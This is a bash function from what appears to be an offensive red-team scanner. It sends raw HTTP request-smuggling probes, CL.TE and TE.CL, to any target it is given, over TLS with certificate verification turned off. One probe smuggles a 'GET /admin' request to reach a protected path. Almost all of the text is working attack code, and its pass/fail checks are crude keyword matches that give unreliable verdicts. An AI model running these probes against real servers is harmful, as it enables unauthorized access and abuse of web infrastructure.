rt_230_http_request_smuggling() {
    local target="${1:-$TARGET}"
    _section "[RT-240] HTTP REQUEST SMUGGLING"
    run "Testing for CL.TE and TE.CL request smuggling..."
    > "$SESSION/rt/http_smuggle.txt"
    # CL.TE test
    local cl_te=$(python3 -c "
import socket, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    sock = socket.create_connection(('${target}', 443), timeout=10)
    ssock = ctx.wrap_socket(sock, server_hostname='${target}')
    req = b'POST / HTTP/1.1\r\nHost: ${target}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG'
    ssock.send(req)
    resp = ssock.recv(4096).decode()
    print(resp[:500])
    ssock.close()
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null)
    echo "$cl_te" | grep -qi 'unrecognized\|bad request\|error\|400' && {
        echo "SMUGGLE CL.TE: Potential desync detected" >> "$SESSION/rt/http_smuggle.txt"
        rt "HTTP request smuggling (CL.TE) detected!"
    }
    # TE.CL test
    local te_cl=$(python3 -c "
import socket, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
try:
    sock = socket.create_connection(('${target}', 443), timeout=10)
    ssock = ctx.wrap_socket(sock, server_hostname='${target}')
    req = b'POST / HTTP/1.1\r\nHost: ${target}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n12\r\nGET /admin HTTP/1.1\r\n\r\n0\r\n\r\n'
    ssock.send(req)
    resp = ssock.recv(4096).decode()
    print(resp[:500])
    ssock.close()
except Exception as e:
    print(f'ERROR: {e}')
" 2>/dev/null)
    echo "$te_cl" | grep -qi 'not found\|admin\|404' && {
        echo "SMUGGLE TE.CL: Second request processed" >> "$SESSION/rt/http_smuggle.txt"
        rt "HTTP request smuggling (TE.CL) detected!"
    }
    [ -s "$SESSION/rt/http_smuggle.txt" ] && rt "HTTP smuggling tests complete" || info "No HTTP smuggling found"
}

